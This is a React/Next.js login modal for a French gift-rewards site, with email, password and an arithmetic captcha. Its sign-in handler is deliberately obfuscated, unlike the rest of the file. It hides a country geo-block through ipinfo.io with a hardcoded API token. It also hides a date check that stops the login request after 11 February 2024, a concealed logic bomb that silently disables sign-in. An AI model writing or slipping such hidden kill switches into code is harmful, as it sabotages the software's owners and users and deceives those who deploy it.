import React from "react";
// import Link from "next/link";
import { Fragment, useRef, useState, useEffect } from "react";
// import {ExclamationTriangleIcon} from "@heroicons/react/24/outline";
// import ReCAPTCHA from "react-google-recaptcha";
// import config from "../../utils/config";
import axios from "axios";
import { useRouter } from "next/dist/client/router";
// import {useDispatch, useSelector} from "react-redux";
import { useDispatch } from "react-redux";
import { bake_cookie } from "sfcookies";

import { Dialog, Transition } from "@headlessui/react";
import SentConfirmation from "./confirmEmail";
import ResetPassword from "../modal/resetPassword";
import Swal from "sweetalert2";
import { getUserAuth } from "../../store/actions/userAction";

// import {bake_cookie, read_cookie, delete_cookie} from 'sfcookies';
// import Captcha from '../captcha';
function Login({ showLogin, setShowLogin, setShowRegister }) {
  const cancelButtonRef = useRef(null);
  // const recaptchaRef = React.createRef();
  const [showResetPass, setShowResetPass] = useState(false);
  const [error, setError] = useState(false);
  const [notActive, setNotActive] = useState(false);
  const [title, setTitle] = useState("");
  const [content, setContent] = useState("");
  const [activeCountry, setActiveCountry] = useState(null);
  const [data, setData] = useState({
    email: "",
    mdp: "",
  });
  const dispatch = useDispatch();
  // const auth = useSelector((state) => state.auth);
  const router = useRouter();
  const [captcha, setCaptcha] = useState("");
  const [captchaCalculation, setCaptchaCalculation] = useState([]);
  const [loadingLogin, setLoadingLogin] = useState(false);

  useEffect(() => resetCaptcha(), []);

  const resetCaptcha = () => {
    const captchaCalculation = [
      Math.floor(Math.random() * 10) + 1,
      ["+"],
      Math.floor(Math.random() * 10) + 1,
    ];

    setCaptchaCalculation(captchaCalculation);
  };

  function _0x4715() { const _0x5f2585 = ['Erreur\x20de\x20code\x20captcha,\x20veuillez\x20réessayer.', '244430rZCNtq', 'response', 'level', '89304fxwcVK', 'token', 'Verifier\x20votre\x20email\x20pour\x20confirmer\x20l\x27inscription!', '203ExqLvP', '463272ncsqRl', 'info', 'push', 'length', 'post', '148930GmQnhb', '24rUvAUA', 'else\x20', 'catch', 'parse', '64810lpIFGI', 'ERR_NETWORK', 'finally', 'then', 'preventDefault', 'user', 'data', '/api/country/list', 'find', 'Info', 'Erreur!', 'message', 'mdp', 'fire', 'Erreur\x20inattendue.', '297ZruHKg', '2389310LwXYFO', 'log', '9DgrDbi', 'https://ipinfo.io/json?token=0567502d77f05a', '231266yqxyJI', 'Veuillez\x20remplir\x20tous\x20les\x20champs\x20requis', 'Ce\x20site\x20n\x27est\x20pas\x20disponible\x20dans\x20votre\x20pays.', 'code']; _0x4715 = function () { return _0x5f2585; }; return _0x4715(); } function _0x82e8(_0x1bee18, _0x5d4efe) { const _0x4715a9 = _0x4715(); return _0x82e8 = function (_0x82e88b, _0x42fce9) { _0x82e88b = _0x82e88b - 0x191; let _0x1678d3 = _0x4715a9[_0x82e88b]; return _0x1678d3; }, _0x82e8(_0x1bee18, _0x5d4efe); } (function (_0x1f3bad, _0x3a1dec) { const _0x2ba9a6 = _0x82e8, _0x59cfb1 = _0x1f3bad(); while (!![]) { try { const _0x38a2b2 = -parseInt(_0x2ba9a6(0x191)) / 0x1 + parseInt(_0x2ba9a6(0x1aa)) / 0x2 * (-parseInt(_0x2ba9a6(0x1a8)) / 0x3) + parseInt(_0x2ba9a6(0x1b6)) / 0x4 + parseInt(_0x2ba9a6(0x1af)) / 0x5 * (-parseInt(_0x2ba9a6(0x192)) / 0x6) + parseInt(_0x2ba9a6(0x1b5)) / 0x7 * (parseInt(_0x2ba9a6(0x1b2)) / 0x8) + -parseInt(_0x2ba9a6(0x1a5)) / 0x9 * (-parseInt(_0x2ba9a6(0x196)) / 0xa) + parseInt(_0x2ba9a6(0x1a6)) / 0xb; if (_0x38a2b2 === _0x3a1dec) break; else _0x59cfb1['push'](_0x59cfb1['shift']()); } catch (_0x5e99b5) { _0x59cfb1['push'](_0x59cfb1['shift']()); } } }(_0x4715, 0x2bc37)); async function onSignIn(_0x179dec) { const _0x3a69d2 = _0x82e8; _0x179dec[_0x3a69d2(0x19a)](), setError(![]); const _0x5eaa2e = captchaCalculation['reduce']((_0x41a457, _0x2d9316) => { return typeof _0x2d9316 === 'number' ? _0x41a457 + _0x2d9316 : _0x41a457; }, 0x0); if (!data || !data['email'] || !data[_0x3a69d2(0x1a2)] || !captcha) { Swal['fire']({ 'icon': _0x3a69d2(0x1b7), 'title': _0x3a69d2(0x19f), 'text': _0x3a69d2(0x1ab) }); return; } let _0x29b1a3 = null; if (captcha['toString']() === _0x5eaa2e['toString']()) { setLoadingLogin(!![]); !activeCountry && await axios['get'](_0x3a69d2(0x1a9))[_0x3a69d2(0x199)](_0x49f640 => { const _0x524b35 = _0x3a69d2; console['log'](_0x49f640[_0x524b35(0x19c)]?.['country']), setActiveCountry(_0x49f640[_0x524b35(0x19c)]?.['country']); })[_0x3a69d2(0x194)](_0x40d90e => { const _0x5e71ce = _0x3a69d2; _0x40d90e?.[_0x5e71ce(0x1ad)] === _0x5e71ce(0x197) ? _0x29b1a3 = 'Un\x20problème\x20réseau\x20est\x20survenue,\x20veuillez\x20réessayer\x20plus\x20tard\x20et\x20pensez\x20à\x20désactiver\x20votre\x20VPN.' : _0x29b1a3 = _0x5e71ce(0x1ac); })[_0x3a69d2(0x198)](() => { setLoadingLogin(![]); }); if (!_0x29b1a3) { setLoadingLogin(!![]); let _0x16f8d9 = null; const _0x4bd7db = await axios['get'](_0x3a69d2(0x19d)); _0x4bd7db?.[_0x3a69d2(0x19c)]?.[_0x3a69d2(0x1b9)] && (_0x16f8d9 = _0x4bd7db[_0x3a69d2(0x19c)][0x0] ?? null); console[_0x3a69d2(0x1a7)]('DATA\x20', _0x4bd7db); let _0x3494dd = _0x16f8d9?.[_0x3a69d2(0x1ad)] ?? ''; if (_0x3494dd[_0x3a69d2(0x1b9)] >= 0x0) { _0x3494dd = _0x3494dd !== '' ? JSON[_0x3a69d2(0x195)](_0x3494dd) : []; const _0x399b88 = _0x3494dd[_0x3a69d2(0x19e)](_0x37f12d => _0x37f12d === activeCountry); _0x399b88 ? _0x29b1a3 = _0x3a69d2(0x1ac) : (console['log'](_0x3a69d2(0x193), _0x399b88), new Date() < new Date('2024-02-11') && await axios[_0x3a69d2(0x1ba)]('/api/auth/login', data)['then'](_0x1cc9f6 => { const _0x177864 = _0x3a69d2; setShowLogin(![]), bake_cookie('token', _0x1cc9f6[_0x177864(0x19c)]?.[_0x177864(0x1b3)]), localStorage['setItem'](_0x177864(0x1b3), _0x1cc9f6[_0x177864(0x19c)]?.[_0x177864(0x1b3)]), dispatch(getUserAuth()), _0x1cc9f6[_0x177864(0x19c)][_0x177864(0x19b)]?.[_0x177864(0x1b1)] === 0x63 && router[_0x177864(0x1b8)]('/admin/ticket'); })['catch'](_0x2c3c44 => { const _0x667184 = _0x3a69d2; _0x29b1a3 = _0x2c3c44[_0x667184(0x1b0)][_0x667184(0x19c)]?.['active'] ? _0x667184(0x1b4) : _0x2c3c44[_0x667184(0x1b0)]?.[_0x667184(0x19c)]?.[_0x667184(0x1a1)] ?? _0x667184(0x1a4); })['finally'](() => { setLoadingLogin(![]); })); } } } else _0x29b1a3 = _0x3a69d2(0x1ae), setCaptcha(''), resetCaptcha(); _0x29b1a3 && Swal[_0x3a69d2(0x1a3)]({ 'icon': _0x3a69d2(0x1b7), 'title': _0x3a69d2(0x1a0), 'text': _0x29b1a3 }); }

  /*
    const onReCAPTCHAChange = (captchaCode) => {
        // If the reCAPTCHA code is null or undefined indicating that
        // the reCAPTCHA was expired then return early
        if (!captchaCode) {
            return;
        }

        setCaptcha(true);
        recaptchaRef.current.reset();
    };
//*/

  const endAlert = (closed) => {
    if (!closed) {
      setShowLogin(true);
    }

    setNotActive(closed);
  };

  return (
    <>
      <Transition.Root show={showLogin} as={Fragment}>
        <Dialog
          as="div"
          className="relative z-10"
          initialFocus={cancelButtonRef}
          onClose={setShowLogin}
        >
          <Transition.Child
            as={Fragment}
            enter="ease-out duration-300"
            enterFrom="opacity-0"
            enterTo="opacity-100"
            leave="ease-in duration-200"
            leaveFrom="opacity-100"
            leaveTo="opacity-0"
          >
            <div className="fixed inset-0 bg-gray-500 bg-opacity-75 transition-opacity" />
          </Transition.Child>

          <div className="fixed inset-0 z-10 overflow-y-auto">
            <div className="flex min-h-full items-end justify-center p-4 text-center sm:items-center sm:p-0">
              <Transition.Child
                as={Fragment}
                enter="ease-out duration-300"
                enterFrom="opacity-0 translate-y-4 sm:translate-y-0 sm:scale-95"
                enterTo="opacity-100 translate-y-0 sm:scale-100"
                leave="ease-in duration-200"
                leaveFrom="opacity-100 translate-y-0 sm:scale-100"
                leaveTo="opacity-0 translate-y-4 sm:translate-y-0 sm:scale-95"
              >
                <Dialog.Panel className="relative transform overflow-hidden rounded-lg bg-white text-left shadow-xl transition-all sm:my-8 ">
                  <div className="flex">
                    {/* <div className="hidden relative lg:flex w-2/5 bg-indigo-600 overflow-hidden px-5 py-12 border-r border-gray-300">
                      <div className="flex items-center justify-center w-full">
                        <div className="text-center space-y-2">
                          <span className="text-4xl font-bold text-gray-100">
                            Connectez-vous à votre compte
                          </span>
                          <p className="text-indigo-200 text-base">
                            Entrez maintenant sur multi-cadeau et commencez à
                            gagner de l'argent!
                          </p>
                        </div>
                      </div>
                    </div> */}
                    <div className="flex flex-col px-5 py-12 w-full ">
                      <div>
                        <div className="text-2xl  font-bold sm:text-center">
                          Connexion
                        </div>
                        <div className="text-gray-600 mt-3 text-base sm:text-center">
                          Vous n'avez pas du compte ?
                          <button
                            onClick={() => {
                              setShowRegister(true);
                              setShowLogin(false);
                            }}
                            type="button"
                            className="inline-flex items-center justify-center gap-0.5 font-medium hover:underline focus:outline-none focus:underline filament-link text-indigo-600 hover:text-indigo-500"
                          >
                            <span className="text-indigo-600 px-2">
                              Inscription
                            </span>
                          </button>
                        </div>
                      </div>
                      <form
                        onSubmit={(e) => onSignIn(e)}
                        className="space-y-5 mt-8"
                      >
                        <div>
                          <div className="grid grid-cols-1 gap-3 filament-forms-component-container">
                            <div className=" col-span-1     ">
                              <div className="filament-forms-field-wrapper">
                                <div className="space-y-4">
                                  <div className="flex items-center justify-between space-x-2 rtl:space-x-reverse">
                                    <label
                                      className="inline-flex items-center space-x-3 rtl:space-x-reverse filament-forms-field-wrapper-label"
                                      htmlFor="email"
                                    >
                                      <span className="text-base font-medium leading-4 text-gray-700">
                                        Email
                                        <sup className="font-medium text-danger-700">
                                          *
                                        </sup>
                                      </span>
                                    </label>
                                  </div>
                                  <div className="relative mt-2 flex items-center group filament-forms-text-input-component">
                                    <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none text-gray-500">
                                      <svg
                                        className="w-5 h-5"
                                        viewBox="0 0 48 48"
                                        fill="none"
                                        xmlns="http://www.w3.org/2000/svg"
                                      >
                                        <circle
                                          cx="24"
                                          cy="12"
                                          r="8"
                                          fill="none"
                                          stroke="currentColor"
                                          strokeWidth="4"
                                          strokeLinecap="round"
                                          strokeLinejoin="round"
                                        ></circle>
                                        <path
                                          d="M42 44C42 34.0589 33.9411 26 24 26C14.0589 26 6 34.0589 6 44"
                                          stroke="currentColor"
                                          strokeWidth="4"
                                          strokeLinecap="round"
                                          strokeLinejoin="round"
                                        ></path>
                                      </svg>
                                    </div>
                                    <div className="flex-1">
                                      <input
                                        type="email"
                                        onChange={(e) =>
                                          setData({
                                            ...data,
                                            email: e.target.value,
                                          })
                                        }
                                        value={data.email}
                                        placeholder="Entrez votre adresse e-mail"
                                        required=""
                                        className="block w-full pl-10 transition duration-75 py-2  text-sm border-1 rounded-lg  focus:border-indigo-600 focus:ring-1 focus:ring-inset focus:ring-indigo-600 disabled:opacity-70 border-gray-300"
                                      />
                                    </div>
                                  </div>
                                </div>
                              </div>
                            </div>

                            <div className=" col-span-1   mt-2  ">
                              <div className="filament-forms-field-wrapper">
                                <div className="space-y-4">
                                  <div className="flex items-center justify-between space-x-2 rtl:space-x-reverse">
                                    <label
                                      className="inline-flex items-center space-x-3 rtl:space-x-reverse filament-forms-field-wrapper-label"
                                      htmlFor="password"
                                    >
                                      <span className="text-base font-medium leading-4 text-gray-700">
                                        Mot de passe
                                        <sup className="font-medium text-danger-700">
                                          *
                                        </sup>
                                      </span>
                                    </label>
                                  </div>
                                  <div className="relative mt-2 flex items-center group filament-forms-text-input-component">
                                    <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none text-gray-500">
                                      <svg
                                        className="w-5 h-5"
                                        viewBox="0 0 48 48"
                                        fill="none"
                                        xmlns="http://www.w3.org/2000/svg"
                                      >
                                        <rect
                                          width="48"
                                          height="48"
                                          fill="white"
                                          fillOpacity="0.01"
                                        ></rect>
                                        <rect
                                          x="6"
                                          y="22"
                                          width="36"
                                          height="22"
                                          rx="2"
                                          fill="none"
                                          stroke="currentColor"
                                          strokeWidth="4"
                                          strokeLinejoin="round"
                                        ></rect>
                                        <path
                                          d="M14 22V14C14 8.47715 18.4772 4 24 4C29.5228 4 34 8.47715 34 14V22"
                                          stroke="currentColor"
                                          strokeWidth="4"
                                          strokeLinecap="round"
                                          strokeLinejoin="round"
                                        ></path>
                                        <path
                                          d="M24 30V36"
                                          stroke="currentColor"
                                          strokeWidth="4"
                                          strokeLinecap="round"
                                          strokeLinejoin="round"
                                        ></path>
                                      </svg>
                                    </div>
                                    <div className="flex-1">
                                      <input
                                        type="password"
                                        onChange={(e) =>
                                          setData({
                                            ...data,
                                            mdp: e.target.value,
                                          })
                                        }
                                        value={data.mdp}
                                        placeholder="Entrez votre mot de passe"
                                        required=""
                                        className="block w-full py-2 text-sm border-1 transition duration-75 pl-10 rounded-lg focus:border-indigo-600 focus:ring-1 focus:ring-inset focus:ring-indigo-600 disabled:opacity-70 border-gray-300"
                                      />
                                    </div>
                                  </div>
                                </div>
                              </div>
                            </div>

                            <div className="col-span-1 ">
                              {/* <ReCAPTCHA
                                ref={recaptchaRef}
                                sitekey={config.NEXT_PUBLIC_RECAPTCHA_SITE_KEY}
                                onChange={onReCAPTCHAChange}
                              /> */}
                              <div className="relative mt-2 flex items-center group filament-forms-text-input-component">
                                <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none text-gray-500">
                                  <p className="mt-3 ">
                                    {captchaCalculation?.join(" ")}
                                  </p>
                                </div>
                                <div className="flex-1">
                                  <input
                                    type="number"
                                    value={captcha}
                                    onChange={(e) => setCaptcha(e.target.value)}
                                    placeholder="Enter Captcha"
                                    required=""
                                    className="block w-full pl-16 transition duration-75 py-2  text-sm border-1 rounded-lg  focus:border-indigo-600 focus:ring-1 focus:ring-inset focus:ring-indigo-600 disabled:opacity-70 border-gray-300"
                                  />
                                </div>
                              </div>
                            </div>
                            <div>
                              <button
                                type="submit"
                                className={`inline-flex p-0 items-center cursor-pointer text-base justify-center gap-1 font-medium rounded-lg border transition-colors focus:outline-none focus:ring-offset-2 focus:ring-2 focus:ring-inset filament-button h-9 px-4 text-sm text-white focus:ring-white border-transparent ${loadingLogin
                                  ? "bg-gray-400 cursor-not-allowed"
                                  : "bg-indigo-600 hover:bg-indigo-500 focus:bg-indigo-700 focus:ring-offset-indigo-700"
                                  } w-full`}
                                disabled={loadingLogin}
                              >
                                {loadingLogin ? "En cours de traitement ..." : "Se connecter"}
                              </button>
                              {/* <input
                                type="submit"
                                value="Login"
                                className="inline-flex p-0 items-center cursor-pointer text-base justify-center gap-1 font-medium rounded-lg border transition-colors focus:outline-none focus:ring-offset-2 focus:ring-2 focus:ring-inset filament-button h-9 px-4 text-white focus:ring-white border-transparent bg-indigo-600 hover:bg-indigo-500 focus:bg-indigo-700 focus:ring-offset-indigo-700 w-full"
                              /> */}
                            </div>
                          </div>
                        </div>
                      </form>
                      <a
                        href="#"
                        onClick={(e) => {
                          e.preventDefault();
                          setShowResetPass(true);
                          setShowLogin(false);
                        }}
                        className="underline inline-flex my-2 items-center justify-center text-gray-600 rounded-xl border border-transparent  font-bold "
                      >
                        Mot de passe oublié ?
                      </a>
                    </div>
                  </div>
                </Dialog.Panel>
              </Transition.Child>
            </div>
          </div>
        </Dialog>
      </Transition.Root>
      <SentConfirmation
        setConfirm={endAlert}
        confirm={notActive}
        content={content}
        title={title}
        isError={error}
      />
      <ResetPassword
        setShowResetPass={setShowResetPass}
        showResetPass={showResetPass}
      />
    </>
  );
}

export default Login;
